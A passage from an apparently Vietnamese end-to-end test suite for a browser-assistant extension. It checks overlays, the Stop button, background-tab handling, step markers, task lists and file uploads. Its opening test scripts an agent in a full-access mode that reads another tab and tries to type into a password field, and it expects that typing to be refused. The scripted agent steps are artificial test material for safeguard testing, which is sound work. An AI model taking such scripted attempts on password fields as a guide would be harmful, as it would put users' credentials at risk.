      const r = await runScript(
        c,
        [
          skill,
          { calls: [{ name: 'page_read', input: { tab_id: otherTabId } }] },
          { calls: [{ name: 'page_snapshot', input: {} }] },
          { calls: [{ name: 'page_type', input: { ref: '@ref:textbox|Mật khẩu|1', text: 'khong-duoc-nhap' } }] },
          { calls: [{ name: 'page_navigate', input: { url: `${c.other}/khuyen-mai` } }] },
          { text: 'Xong.' },
        ],
        'Làm giúp tôi',
        'deny', // nếu có thẻ xin phép nào hiện ra thì bị TỪ CHỐI → test sẽ thấy ngay
      );
      await second.close();
      expect(r.perms, JSON.stringify(r.perms.map((p: any) => p.title))).toHaveLength(0);
      expect(resultOf(r.requests, 'page_read')[0].content as string).toContain('Nội dung của trang bi-mat');
      expect(resultOf(r.requests, 'page_type')[0].content as string).toContain('trợ lý không được nhập');
      expect(new URL(c.fixture.url()).origin).toBe(new URL(c.other).origin);

      // tắt bằng thanh cảnh báo; dọn cài đặt để không ảnh hưởng test sau
      await c.panel.bringToFront();
      await c.panel.click('.fullaccess-bar .link-btn');
      await c.panel.waitForFunction(() => !document.querySelector('.fullaccess-bar'), { timeout: 5000 });
      expect(await c.panel.evaluate(() => (window as any).__nd.controller.snapshot().session.mode)).toBe('default');
      await c.panel.evaluate(async () => {
        const ctl = (window as any).__nd.controller;
        await ctl.onMessage({ type: 'set_browser_setting', key: 'allowBypass', value: false });
        await ctl.onMessage({ type: 'set_browser_setting', key: 'defaultMode', value: 'default' });
      });
    });


    // ───────────────────── Viền sáng + nút Dừng · không giành tab · nhóm tab của trợ lý ─────────────────────
    const tabIdOf = (page: Page) => c.panel.evaluate(async (u) => (await chrome.tabs.query({})).find((t) => t.url === u)?.id, page.url());
    const activeTabId = () =>
      c.panel.evaluate(async () => {
        const win = await chrome.windows.getCurrent();
        return (await chrome.tabs.query({ active: true, windowId: win.id }))[0]?.id;
      });
    /** Màu (RGBA) của một điểm ảnh trong ảnh base64 — chạy trong khung chat. */
    const pixelOf = (im: { mediaType: string; data: string }, x: number, y: number) =>
      c.panel.evaluate(
        async (im, x, y) => {
          const el = new Image();
          el.src = `data:${im.mediaType};base64,${im.data}`;
          await el.decode();
          const cv = document.createElement('canvas');
          cv.width = el.naturalWidth;
          cv.height = el.naturalHeight;
          const ctx = cv.getContext('2d')!;
          ctx.drawImage(el, 0, 0);
          return Array.from(ctx.getImageData(x, y, 1, 1).data);
        },
        im,
        x,
        y,
      );
    const overlayOf = (page: Page) =>
      page.evaluate(() => {
        const host = document.querySelector('[data-nd-overlay]') as HTMLElement | null;
        if (!host) return null;
        const r = host.getBoundingClientRect();
        const cs = getComputedStyle(host);
        const mid = document.elementFromPoint(document.documentElement.clientWidth / 2, window.innerHeight / 3);
        return { w: Math.round(r.width), vw: document.documentElement.clientWidth, h: Math.round(r.height), vh: window.innerHeight, z: cs.zIndex, pe: cs.pointerEvents, vis: cs.visibility, closed: host.shadowRoot === null, pageUnderneath: mid !== host };
      });

    it(
      'viền sáng + nút Dừng: hiện trên trang trợ lý đang làm việc (shadow DOM đóng, không chặn trang, không lọt vào ảnh chụp, được gia hạn quá hạn tự gỡ); bấm nút Dừng THẬT thì lượt dừng, thẻ xin phép bị từ chối, viền sáng gỡ',
      async () => {
        await newRun(c, 'default');
        await c.fixture.bringToFront(); // người dùng đang xem trang mẫu: chụp màn hình chụp thẳng, không phải chuyển tab
        await c.panel.evaluate(async () => {
          const w = window as any;
          await w.__ndTest.script([
            { calls: [{ name: 'page_read', input: {} }] },
            { calls: [{ name: 'page_screenshot', input: {} }] },
            { calls: [{ name: 'load_skill', input: { skill_name: 'browser-control' } }] },
            { calls: [{ name: 'page_snapshot', input: {} }] },
            { calls: [{ name: 'page_click', input: { ref: '@ref:button|Thêm vào giỏ|1' } }] },
            { text: 'Xong.' },
          ]);
          void w.__nd.controller.send('Thêm áo dài vào giỏ', []);
        });
        // Lượt chạy dừng chờ ở thẻ xin phép bấm → trợ lý đang "làm việc" trên trang mẫu
        await c.panel.waitForFunction(
          () => (window as any).__nd.controller.snapshot().view.transcript.some((i: any) => i.kind === 'assistant' && i.blocks.some((b: any) => b.type === 'tool' && b.state === 'awaiting_permission')),
          { timeout: 30_000, polling: 100 },
        );

        // 1) Viền sáng phủ cả trang, nằm trong shadow DOM ĐÓNG, không nhận chuột (trừ nút Dừng) nên trang bên dưới vẫn dùng bình thường
        const ov = await overlayOf(c.fixture);
        expect(ov, 'lớp phủ có trên trang').not.toBeNull();
        expect(ov).toMatchObject({ w: ov!.vw, h: ov!.vh, z: '2147483647', pe: 'none', vis: 'visible', closed: true, pageUnderneath: true });
        if (SHOTS) {
          await c.fixture.bringToFront();
          await c.fixture.screenshot({ path: path.join(SHOTS, `${name}-presence-glow.png`) });
          await c.panel.bringToFront();
        }

        // 2) Ảnh chụp gửi cho mô hình là trang SẠCH (viền sáng bị ẩn lúc chụp). Đối chứng: ảnh chụp thẳng bằng CDP (có lớp phủ) thì viền xanh lam ngọc hiện ở mép.
        const shot = await c.panel.evaluate(() => {
          const tr = (window as any).__nd.controller.snapshot().view.transcript;
          const b = tr.filter((i: any) => i.kind === 'assistant').flatMap((i: any) => i.blocks).find((x: any) => x.type === 'tool' && x.name === 'page_screenshot');
          return b?.images?.[0] ?? null;
        });
        expect(shot, 'ảnh chụp có trong dòng công cụ').not.toBeNull();
        const clean = await pixelOf(shot, 1, 1);
        expect(clean[0], `mép ảnh gửi cho mô hình phải là nền trang (không viền sáng): ${clean}`).toBeGreaterThan(200);
        const direct = await c.fixture.screenshot({ type: 'png', encoding: 'base64' });
        const withGlow = await pixelOf({ mediaType: 'image/png', data: direct as string }, 1, 1);
        expect(withGlow[0], `đối chứng: ảnh chụp thẳng thấy viền sáng xanh lam ngọc: ${withGlow}`).toBeLessThan(200);
        expect(withGlow[2]).toBeGreaterThan(200); // xanh lam: kênh B cao

        // 3) Quá hạn tự gỡ của trang (15 s) mà viền sáng vẫn còn → nhịp gia hạn đang chạy
        await new Promise((r) => setTimeout(r, 17_000));
        expect(await overlayOf(c.fixture), 'viền sáng còn sau quá hạn tự gỡ nhờ nhịp gia hạn').not.toBeNull();

        // 4) Bấm nút Dừng THẬT (chuột thật, isTrusted) — toạ độ lấy từ CDP vì nút nằm trong shadow DOM đóng
        const client = await c.fixture.createCDPSession();
        const { root } = await client.send('DOM.getDocument', { depth: -1, pierce: true });
        const find = (n: any, pred: (n: any) => boolean): any => {
          if (pred(n)) return n;
          for (const ch of [...(n.children ?? []), ...(n.shadowRoots ?? []), ...(n.contentDocument ? [n.contentDocument] : [])]) {
            const f = find(ch, pred);
            if (f) return f;
          }
          return null;
        };
        const host = find(root, (n) => n.nodeName === 'DIV' && (n.attributes ?? []).includes('data-nd-overlay'));
        expect(host, 'tìm thấy máy chủ lớp phủ qua CDP').toBeTruthy();
        const btn = find(host.shadowRoots[0], (n) => n.nodeName === 'BUTTON');
        expect(btn, 'tìm thấy nút Dừng trong shadow DOM').toBeTruthy();
        const box = (await client.send('DOM.getBoxModel', { nodeId: btn.nodeId })).model.content;
        const cx = (box[0] + box[2] + box[4] + box[6]) / 4;
        const cy = (box[1] + box[3] + box[5] + box[7]) / 4;
        const label = await client.send('DOM.getOuterHTML', { nodeId: btn.nodeId });
        expect(label.outerHTML).toContain('Dừng');
        await c.fixture.bringToFront();
        await c.fixture.mouse.click(cx, cy);
        await c.panel.waitForFunction(() => !(window as any).__nd.controller.isRunning, { timeout: 20_000, polling: 200 });
        await c.fixture.waitForFunction(() => !document.querySelector('[data-nd-overlay]'), { timeout: 10_000, polling: 200 });
        expect(await c.fixture.$eval('#cart', (e) => e.textContent)).toBe('0'); // nút "Thêm vào giỏ" không hề được bấm
        const clickState = await c.panel.evaluate(() => {
          const tr = (window as any).__nd.controller.snapshot().view.transcript;
          return tr.filter((i: any) => i.kind === 'assistant').flatMap((i: any) => i.blocks).find((x: any) => x.type === 'tool' && x.name === 'page_click')?.state;
        });
        expect(clickState).not.toBe('done');
        await client.detach();
        await c.panel.bringToFront();
      },
      150_000,
    );

    it('lượt chạy kết thúc bình thường: viền sáng trên mọi trang đã đọc được gỡ sạch', async () => {
      await newRun(c, 'default');
      await c.panel.bringToFront();
      await runScript(c, [{ calls: [{ name: 'page_read', input: {} }] }, { text: 'Đã đọc.' }], 'Đọc trang');
      await c.fixture.waitForFunction(() => !document.querySelector('[data-nd-overlay]'), { timeout: 10_000, polling: 200 });
    });

    it('không giành tab: thao tác trên tab nền mà người dùng vẫn ở tab của mình (KHÔNG tab nào bị kích hoạt, kể cả khi chụp màn hình — bị từ chối thay vì nhấp nháy); tab trợ lý mở ra ở nền và được gom vào nhóm "Locaith AI" màu xanh lam ngọc, tab của người dùng thì không', async () => {
      await newRun(c, 'acceptEdits');
      await c.panel.bringToFront(); // "tab người dùng đang xem" = khung chat; trang mẫu nằm nền
      const fixtureId = await tabIdOf(c.fixture);
      const userId = await activeTabId();
      expect(userId).not.toBe(fixtureId);
      await c.panel.evaluate(() => {
        const w = window as any;
        w.__acts = [];
        w.__onAct = (i: { tabId: number }) => w.__acts.push(i.tabId);
        chrome.tabs.onActivated.addListener(w.__onAct);
      });
      const r = await runScript(
        c,
        [
          { calls: [{ name: 'load_skill', input: { skill_name: 'browser-control' } }] },
          { calls: [{ name: 'page_snapshot', input: {} }] },
          { calls: [{ name: 'page_click', input: { ref: '@ref:button|Thêm vào giỏ|1' } }] },
          { calls: [{ name: 'page_screenshot', input: {} }] },
          { calls: [{ name: 'tab_open', input: { url: `${c.other}/tab-cua-tro-ly` } }] },
          { calls: [{ name: 'page_read', input: {} }] },
          { text: 'Xong.' },
        ],
        'Làm giúp',
        'allow',
      );
      const acts = await c.panel.evaluate(() => {
        const w = window as any;
        chrome.tabs.onActivated.removeListener(w.__onAct);
        return w.__acts as number[];
      });
      expect(await c.fixture.$eval('#cart', (e) => e.textContent), 'bấm trên tab nền vẫn có tác dụng').toBe('1');
      expect(resultOf(r.requests, 'page_screenshot')[0].content, 'chụp tab nền bị từ chối kèm hướng dẫn').toContain('đang nằm nền');
      expect(resultOf(r.requests, 'page_read')[0].content, 'tab mở thêm là tab làm việc').toContain('Trang tab-cua-tro-ly');
      expect(resultOf(r.requests, 'tab_open')[0].content).toContain('mở ở nền');
      // KHÔNG có lần kích hoạt tab nào: bấm, chụp (bị từ chối), mở tab, đọc đều không đụng tới tab người dùng đang xem
      expect(acts).toEqual([]);
      void fixtureId;
      expect(await activeTabId()).toBe(userId);

      const groups = await c.panel.evaluate(async () => {
        const gs = await chrome.tabGroups.query({});
        const tabs = await chrome.tabs.query({});
        return { groups: gs.map((g) => ({ title: g.title, color: g.color, tabs: tabs.filter((t) => t.groupId === g.id).map((t) => t.url) })), grouped: tabs.filter((t) => t.groupId !== -1).length };
      });
      const mine = groups.groups.filter((g) => g.title === 'Locaith AI');
      expect(mine, JSON.stringify(groups)).toHaveLength(1);
      expect(mine[0].color).toBe('cyan');
      expect(mine[0].tabs).toEqual([`${c.other}/tab-cua-tro-ly`]); // trang mẫu (tab gốc) và khung chat không bị gom
      if (SHOTS) await c.panel.screenshot({ path: path.join(SHOTS, `${name}-no-steal.png`) });

      // dọn: viền sáng trên tab mới cũng được gỡ; đóng tab đó
      const opened = (await c.browser.pages()).find((p) => p.url().includes('/tab-cua-tro-ly'));
      expect(opened, 'tab trợ lý mở').toBeTruthy();
      await opened!.waitForFunction(() => !document.querySelector('[data-nd-overlay]'), { timeout: 10_000, polling: 200 });
      await opened!.close();
    });

    it('cài đặt "cho phép trợ lý đưa tab lên trước": bật thì thao tác đưa tab đích lên trước (như trước đây); tắt lại thì trợ lý không đụng vào', async () => {
      await newRun(c, 'acceptEdits');
      await c.panel.bringToFront();
      const fixtureId = await tabIdOf(c.fixture);
      const turns: Turn[] = [
        { calls: [{ name: 'load_skill', input: { skill_name: 'browser-control' } }] },
        { calls: [{ name: 'page_snapshot', input: {} }] },
        { calls: [{ name: 'page_click', input: { ref: '@ref:button|Thêm vào giỏ|1' } }] },
        { text: 'Xong.' },
      ];
      const setFocus = (v: boolean) => c.panel.evaluate((v) => (window as any).__nd.controller.onMessage({ type: 'set_browser_setting', key: 'focusTabs', value: v }), v);
      await setFocus(true);
      try {
        await runScript(c, structuredClone(turns), 'Thêm vào giỏ', 'allow');
        expect(await activeTabId(), 'bật focusTabs: tab đích được đưa lên trước').toBe(fixtureId);
      } finally {
        await setFocus(false);
        await c.panel.bringToFront();
      }
      await newRun(c, 'acceptEdits');
      await c.panel.bringToFront();
      const userId = await activeTabId();
      await runScript(c, structuredClone(turns), 'Thêm vào giỏ', 'allow');
      expect(await activeTabId(), 'tắt focusTabs: người dùng vẫn ở tab của mình').toBe(userId);
    });


    // ───────────────────── Chụp tab nền không nhấp nháy · con trỏ chuột ảo + số bước ─────────────────────
    const setBrowserSetting = (key: string, value: unknown) => c.panel.evaluate((k, v) => (window as any).__nd.controller.onMessage({ type: 'set_browser_setting', key: k, value: v }), key, value);
    const trackActivations = () =>
      c.panel.evaluate(() => {
        const w = window as any;
        w.__acts = [];
        w.__onAct = (i: { tabId: number }) => w.__acts.push(i.tabId);
        chrome.tabs.onActivated.addListener(w.__onAct);
      });
    const stopTracking = () =>
      c.panel.evaluate(() => {
        const w = window as any;
        chrome.tabs.onActivated.removeListener(w.__onAct);
        return w.__acts as number[];
      });
    /** HTML của lớp `.fx` (con trỏ, khung, dấu số) trong shadow DOM ĐÓNG của lớp phủ — lấy qua CDP vì trang không với tới được. */
    const overlayFxHtml = async (page: Page): Promise<string> => {
      const client = await page.createCDPSession();
      try {
        const { root } = await client.send('DOM.getDocument', { depth: -1, pierce: true });
        const find = (n: any, pred: (n: any) => boolean): any => {
          if (pred(n)) return n;
          for (const ch of [...(n.children ?? []), ...(n.shadowRoots ?? []), ...(n.contentDocument ? [n.contentDocument] : [])]) {
            const f = find(ch, pred);
            if (f) return f;
          }
          return null;
        };
        const hasClass = (n: any, cls: string) => {
          const a: string[] = n.attributes ?? [];
          const i = a.indexOf('class');
          return i >= 0 && a[i + 1].split(' ').includes(cls);
        };
        const host = find(root, (n) => n.nodeName === 'DIV' && (n.attributes ?? []).includes('data-nd-overlay'));
        if (!host) return '';
        const fx = find(host.shadowRoots[0], (n) => n.nodeName === 'DIV' && hasClass(n, 'fx'));
        return fx ? (await client.send('DOM.getOuterHTML', { nodeId: fx.nodeId })).outerHTML : '';
      } finally {
        await client.detach().catch(() => undefined);
      }
    };
    const px = (style: string, prop: string) => Number(new RegExp(`(?:^|[;\\s])${prop}:\\s*(-?[\\d.]+)px`).exec(style)?.[1] ?? NaN);
    const markersOf = (html: string) => [...html.matchAll(/<div class="mk"[^>]*style="([^"]*)"[^>]*>(\d+)<\/div>/g)].map((m) => ({ n: m[2], left: px(m[1], 'left'), top: px(m[1], 'top'), hidden: /visibility:\s*hidden/.test(m[1]) }));

    it('chụp màn hình tab NỀN: mặc định bị từ chối và KHÔNG tab nào được kích hoạt (hết nhấp nháy); bật "đưa tab lên trước" thì chụp được, chỉ chuyển thoáng qua rồi trả về', async () => {
      await newRun(c);
      await c.panel.bringToFront(); // người dùng ở tab khác (khung chat); trang mẫu nằm nền
      const fixtureId = await tabIdOf(c.fixture);
      const userId = await activeTabId();
      expect(userId).not.toBe(fixtureId);
      await trackActivations();
      const r = await runScript(c, [{ calls: [{ name: 'page_screenshot', input: {} }] }, { text: 'Không chụp được.' }], 'Chụp màn hình');
      expect(await stopTracking(), 'không có tab nào bị kích hoạt').toEqual([]);
      expect(await activeTabId()).toBe(userId);
      const refused = resultOf(r.requests, 'page_screenshot')[0];
      expect(refused.content).toContain('đang nằm nền');
      expect(refused.content).toContain('page_snapshot');
      expect(r.requests[1].images ?? 0).toBe(0);
      expect(toolBlocks(r.transcript).find((b) => b.name === 'page_screenshot')?.images).toBeUndefined();

      // Người dùng cho phép đưa tab lên trước: chụp được, và CHỈ một lần chuyển thoáng qua rồi trả về
      await setBrowserSetting('focusTabs', true);
      try {
        await newRun(c);
        await c.panel.bringToFront();
        await trackActivations();
        const r2 = await runScript(c, [{ calls: [{ name: 'page_screenshot', input: {} }] }, { text: 'Đã chụp.' }], 'Chụp màn hình');
        expect(await stopTracking()).toEqual([fixtureId, userId]);
        expect(r2.requests[1].images).toBe(1);
        expect(await activeTabId()).toBe(userId);
      } finally {
        await setBrowserSetting('focusTabs', false);
        await c.panel.bringToFront();
      }
    });

    it(
      'con trỏ chuột ảo: bay tới phần tử, khung đánh dấu + vòng sóng, dấu số giữ lại ở các chỗ đã thao tác và KHỚP số bước trong khung chat; dấu bám theo phần tử khi cuộn; kết quả ghi "Bước N" + nơi diễn ra',
      async () => {
        await newRun(c, 'acceptEdits');
        await c.fixture.bringToFront(); // người dùng đang xem trang: hiệu ứng chạy thật
        await c.panel.evaluate(async () => {
          const w = window as any;
          await w.__ndTest.script([
            { calls: [{ name: 'load_skill', input: { skill_name: 'browser-control' } }] },
            { calls: [{ name: 'page_snapshot', input: {} }] },
            { calls: [{ name: 'page_click', input: { ref: '@ref:button|Thêm vào giỏ|1' } }] },
            { calls: [{ name: 'page_type', input: { ref: '@ref:searchbox|Tìm sản phẩm|1', text: 'áo dài' } }] },
            { calls: [{ name: 'page_click', input: { ref: '@ref:button|Thêm vào giỏ|2' } }] },
            { calls: [{ name: 'tabs_list', input: {} }] }, // luôn hỏi → lượt chạy dừng chờ ở đây để xem hiệu ứng
            { text: 'Xong.' },
          ]);
          void w.__nd.controller.send('Thêm hai sản phẩm rồi tìm áo dài', []);
        });
        await c.panel.waitForFunction(
          () => (window as any).__nd.controller.snapshot().view.transcript.some((i: any) => i.kind === 'assistant' && i.blocks.some((b: any) => b.type === 'tool' && b.name === 'tabs_list' && b.state === 'awaiting_permission')),
          { timeout: 60_000, polling: 100 },
        );
        expect(await c.fixture.$eval('#cart', (e) => e.textContent)).toBe('2');

        const rectsOf = () =>
          c.fixture.evaluate(() => [...document.querySelectorAll('button')].filter((b) => b.textContent?.trim() === 'Thêm vào giỏ').map((b) => { const r = b.getBoundingClientRect(); return { l: r.left, t: r.top, cx: r.left + r.width / 2, cy: r.top + r.height / 2 }; }));
        const rects = await rectsOf();
        const html = await overlayFxHtml(c.fixture);
        expect(html, 'có lớp .fx của lớp phủ').toContain('class="fx"');

        // Dấu số 1, 2, 3 (bấm, gõ, bấm) — đúng thứ tự, dấu 1 nằm ở góc trên-trái nút thứ nhất
        const marks = markersOf(html);
        expect(marks.map((m) => m.n)).toEqual(['1', '2', '3']);
        expect(Math.abs(marks[0].left - Math.max(12, rects[0].l))).toBeLessThan(2);
        expect(Math.abs(marks[0].top - Math.max(12, rects[0].t))).toBeLessThan(2);
        expect(Math.abs(marks[2].left - Math.max(12, rects[1].l))).toBeLessThan(2);

        // Con trỏ đang đứng ở GIỮA nút vừa bấm (bước 3), mang nhãn "3 · Bấm nút “Thêm vào giỏ”"
        const cur = /<div class="cur([^"]*)"[^>]*style="[^"]*translate\((-?\d+)px,\s*(-?\d+)px\)/.exec(html);
        expect(cur, html.slice(0, 600)).toBeTruthy();
        expect(cur![1]).toContain('on');
        expect(Math.abs(Number(cur![2]) - rects[1].cx)).toBeLessThan(3);
        expect(Math.abs(Number(cur![3]) - rects[1].cy)).toBeLessThan(3);
        const tag = /<span class="tag"><span class="n">(\d+)<\/span><span class="t">([^<]*)<\/span>/.exec(html);
        expect(tag?.[1]).toBe('3');
        expect(tag?.[2]).toBe('Bấm nút “Thêm vào giỏ”');
        if (SHOTS) {
          fs.mkdirSync(SHOTS, { recursive: true });
          await c.fixture.screenshot({ path: path.join(SHOTS, `${name}-cursor.png`) });
        }

        // Cuộn trang: dấu số bám theo phần tử (không đứng yên trên màn hình)
        await c.fixture.evaluate(() => window.scrollBy(0, 200));
        await new Promise((r) => setTimeout(r, 600));
        const rects2 = await rectsOf();
        const marks2 = markersOf(await overlayFxHtml(c.fixture));
        expect(marks2[0].top).not.toBe(marks[0].top);
        expect(Math.abs(marks2[0].top - Math.max(12, rects2[0].t))).toBeLessThan(2);
        await c.fixture.evaluate(() => window.scrollTo(0, 0));

        // Khung chat: số bước trên dòng công cụ khớp số trên trang
        await c.panel.bringToFront();
        await c.panel.waitForFunction(() => document.querySelectorAll('.tool-step').length >= 3, { timeout: 15_000 });
        expect(await c.panel.$$eval('.tool-step', (els) => els.map((e) => e.textContent))).toEqual(['1', '2', '3']);

        // Kết thúc: dừng lượt chạy; kết quả gửi cho mô hình ghi rõ "Bước N" và nơi diễn ra
        await c.panel.evaluate(() => (window as any).__nd.controller.stop());
        await c.panel.waitForFunction(() => !(window as any).__nd.controller.isRunning, { timeout: 20_000 });
        const requests = await c.panel.evaluate(() => (window as any).__ndTest.requests());
        const clicks = resultOf(requests, 'page_click').map((x: any) => x.content as string);
        expect(clicks[0]).toMatch(/^Bước 1 · Đã bấm nút “Thêm vào giỏ” — tại http:\/\/127\.0\.0\.1:\d+\/shop\.html\./);
        expect(clicks[1]).toMatch(/^Bước 3 · Đã bấm nút “Thêm vào giỏ”/);
        expect(resultOf(requests, 'page_type')[0].content as string).toMatch(/^Bước 2 · Đã gõ vào /);
        await c.fixture.waitForFunction(() => !document.querySelector('[data-nd-overlay]'), { timeout: 10_000, polling: 200 });
      },
      150_000,
    );


    // ───────────────────── Bảng tác vụ: việc còn lại bấm được để chạy tiếp ─────────────────────
    it('bảng tác vụ: khi đã dừng mà còn việc dở, mỗi bước còn lại là một nút bấm để trợ lý làm tiếp (có "Tiếp tục tất cả" và nút ẩn); hết việc thì ẩn hẳn', async () => {
      await newRun(c);
      await c.panel.bringToFront();
      const todos = [
        { id: 'a', title: 'Lấy danh sách tuyến bài', status: 'completed' },
        { id: 'b', title: 'Đọc nội dung fanpage', status: 'in_progress' },
        { id: 'c', title: 'Đề xuất kế hoạch', status: 'pending' },
      ];
      await runScript(c, [{ calls: [{ name: 'todo_write', input: { todos } }] }, { text: 'Tôi dừng ở đây.' }], 'Lập kế hoạch');
      await c.panel.waitForSelector('.todo-choices', { timeout: 10_000 });
      expect(await c.panel.$$eval('.todo-pick .todo-text', (els) => els.map((e) => e.textContent))).toEqual(['Đọc nội dung fanpage', 'Đề xuất kế hoạch']); // việc đã xong không hiện
      expect(await c.panel.$eval('.todo-choices .todo-all', (e) => e.textContent)).toContain('Tiếp tục tất cả');
      if (SHOTS) await c.panel.screenshot({ path: path.join(SHOTS, `${name}-todo-choices.png`) });

      // bấm một bước → trợ lý làm tiếp đúng bước đó (tin nhắn "Tiếp tục: …" được gửi đi)
      await c.panel.evaluate(async () => (window as any).__ndTest.script([{ text: 'Đã làm tiếp.' }]));
      await c.panel.click('.todo-pick');
      await c.panel.waitForFunction(
        () => (window as any).__nd.controller.snapshot().view.transcript.some((i: any) => i.kind === 'user' && i.text === 'Tiếp tục: Đọc nội dung fanpage'),
        { timeout: 15_000, polling: 100 },
      );
      await c.panel.waitForFunction(() => !(window as any).__nd.controller.isRunning, { timeout: 15_000, polling: 100 });
      await c.panel.waitForSelector('.todo-choices', { timeout: 10_000 }); // kế hoạch chưa được cập nhật → vẫn còn việc để chọn

      // nút ẩn: danh sách việc còn lại biến mất
      await c.panel.click('.todo-dismiss');
      await c.panel.waitForFunction(() => !document.querySelector('.todo-choices'), { timeout: 5000 });

      // hết việc (mọi bước đã xong) → không còn bảng nào
      await newRun(c);
      await runScript(c, [{ calls: [{ name: 'todo_write', input: { todos: todos.map((x) => ({ ...x, status: 'completed' })) } }] }, { text: 'Xong hết.' }], 'Làm hết');
      await new Promise((r) => setTimeout(r, 300));
      expect(await c.panel.$('.todo')).toBeNull();
    });


    // ───────────────────── Bám tab ─────────────────────
    it('bám tab: sau tin nhắn đầu chip chuyển sang "Đang bám …" (có nút ×); bấm × thì trở lại "Đang xem …"', async () => {
      await newRun(c);
      await c.panel.bringToFront();
      await c.panel.waitForSelector('.chip-tab', { timeout: 10_000 });
      expect(await c.panel.$eval('.chip-tab .chip-text', (e) => e.textContent)).toContain('Đang xem');
      await runScript(c, [{ text: 'Chào.' }], 'Xin chào');
      await c.panel.waitForSelector('.chip-tab.is-pinned', { timeout: 10_000 });
      expect(await c.panel.$eval('.chip-tab.is-pinned .chip-text', (e) => e.textContent)).toContain('Đang bám');
      if (SHOTS) await c.panel.screenshot({ path: path.join(SHOTS, `${name}-pinned-chip.png`) });
      await c.panel.click('.chip-tab.is-pinned .chip-x');
      await c.panel.waitForFunction(() => !document.querySelector('.chip-tab.is-pinned'), { timeout: 5000 });
      expect(await c.panel.$eval('.chip-tab .chip-text', (e) => e.textContent)).toContain('Đang xem');
    });


    // ───────────────────── Tệp tải lên: PDF, Word, Excel, HTML, CSV, TXT ─────────────────────
    describe('tệp tải lên', () => {
      let tmp: string;
      const PDF = path.join(ROOT, 'test', 'fixtures', 'docs', 'bao-cao.pdf');
      beforeAll(async () => {
        tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'nd-e2e-docs-'));
        if (SHOTS) fs.mkdirSync(SHOTS, { recursive: true });
        const { Document, Packer, Paragraph, TextRun } = await import('docx');
        const word = new Document({ sections: [{ children: [new Paragraph({ children: [new TextRun('Hợp đồng thuê văn phòng — bên B: Nguyễn Thị Thuỷ Tiên.')] })] }] });
        fs.writeFileSync(path.join(tmp, 'hop-dong.docx'), await Packer.toBuffer(word));
        const { zipSync, strToU8 } = await import('fflate');
        const ns = 'http://schemas.openxmlformats.org/spreadsheetml/2006/main';
        fs.writeFileSync(
          path.join(tmp, 'doanh-thu.xlsx'),
          zipSync({
            '[Content_Types].xml': strToU8('<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"/>'),
            'xl/workbook.xml': strToU8(`<?xml version="1.0"?><workbook xmlns="${ns}" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"><sheets><sheet name="Quý 3" sheetId="1" r:id="rId1"/></sheets></workbook>`),
            'xl/_rels/workbook.xml.rels': strToU8('<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/></Relationships>'),
            'xl/worksheets/sheet1.xml': strToU8(`<?xml version="1.0"?><worksheet xmlns="${ns}"><sheetData><row r="1"><c r="A1" t="inlineStr"><is><t>Khu vực</t></is></c><c r="B1" t="inlineStr"><is><t>Doanh thu</t></is></c></row><row r="2"><c r="A2" t="inlineStr"><is><t>Đà Nẵng</t></is></c><c r="B2"><v>3100</v></c></row></sheetData></worksheet>`),
          }),
        );
      });
      afterAll(() => fs.rmSync(tmp, { recursive: true, force: true }));

      const choose = async (...files: string[]) => {
        const input = await c.panel.$('input[type=file]');
        await input!.uploadFile(...files);
      };
      /** Thả tệp vào ô nhập như kéo từ Explorer: dựng DragEvent có DataTransfer chứa File. */
      const drop = (files: { name: string; type: string; content: string }[]) =>
        c.panel.evaluate((fs) => {
          const dt = new DataTransfer();
          for (const f of fs) dt.items.add(new File([f.content], f.name, { type: f.type }));
          document.querySelector('.composer')!.dispatchEvent(new DragEvent('drop', { dataTransfer: dt, bubbles: true, cancelable: true }));
        }, files);
      const settled = (n: number) =>
        c.panel.waitForFunction((n) => document.querySelectorAll('.composer .chip-doc:not(.is-reading)').length === n && !document.querySelector('.composer .chip-doc.is-reading'), { timeout: 40_000, polling: 100 }, n);
      /** Bài trước có thể để lại chip/chữ trong ô nhập (ô nhập sống qua các cuộc trò chuyện mới) → dọn trước khi bắt đầu. */
      const clearComposer = async () => {
        for (let i = 0; i < 10 && (await c.panel.$('.composer .chip-doc .chip-x')); i++) {
          await c.panel.click('.composer .chip-doc .chip-x');
          await new Promise((r) => setTimeout(r, 60));
        }
        await c.panel.evaluate(() => {
          const ta = document.querySelector<HTMLTextAreaElement>('.composer-input');
          if (ta) ta.value = '';
        });
      };

      it('chọn PDF + Word + Excel: mỗi tệp thành một chip có số trang/trang tính; gửi đi thì mô hình nhận chữ của cả ba trong khung dữ liệu; không lỗi console (docparse.js nạp được dưới CSP của MV3)', async () => {
        await newRun(c);
        await c.panel.bringToFront();
        await c.panel.evaluate(async () => (window as any).__ndTest.script([{ text: 'Báo cáo nói về doanh thu quý 3.' }]));
        await clearComposer();
        await choose(PDF, path.join(tmp, 'hop-dong.docx'), path.join(tmp, 'doanh-thu.xlsx'));
        await settled(3);
        const chips = await c.panel.$$eval('.composer .chip-doc', (els) => els.map((e) => ({ text: e.querySelector('.chip-text')?.textContent, title: e.getAttribute('title') })));
        expect(chips.map((x) => x.text)).toEqual(['bao-cao.pdf', 'hop-dong.docx', 'doanh-thu.xlsx']);
        expect(chips[0].title).toContain('2 trang');
        expect(chips[2].title).toContain('1 trang tính');
        if (SHOTS) await c.panel.screenshot({ path: path.join(SHOTS, `${name}-upload-chips.png`) });

        await c.panel.type('.composer-input', 'Tóm tắt ba tệp này');
        await c.panel.click('.send-btn');
        await c.panel.waitForFunction(() => (window as any).__ndTest.requests().length >= 1, { timeout: 20_000, polling: 100 });
        await c.panel.waitForFunction(() => !(window as any).__nd.controller.isRunning, { timeout: 20_000, polling: 100 });
        const sent: string = await c.panel.evaluate(() => (window as any).__ndTest.requests()[0].lastUser);
        expect(sent.match(/<tep_tai_len /g)).toHaveLength(3);
        expect(sent).toContain('Báo cáo kinh doanh quý 3');
        expect(sent).toContain('Trang hai: kế hoạch quý 4');
        expect(sent).toContain('Hợp đồng thuê văn phòng — bên B: Nguyễn Thị Thuỷ Tiên.');
        expect(sent).toContain('Đà Nẵng');
        expect(sent.trimEnd().endsWith('Tóm tắt ba tệp này')).toBe(true);
        // sau khi gửi: chip rời ô nhập và nằm trong tin nhắn của người dùng; không còn chữ của tệp trong giao diện
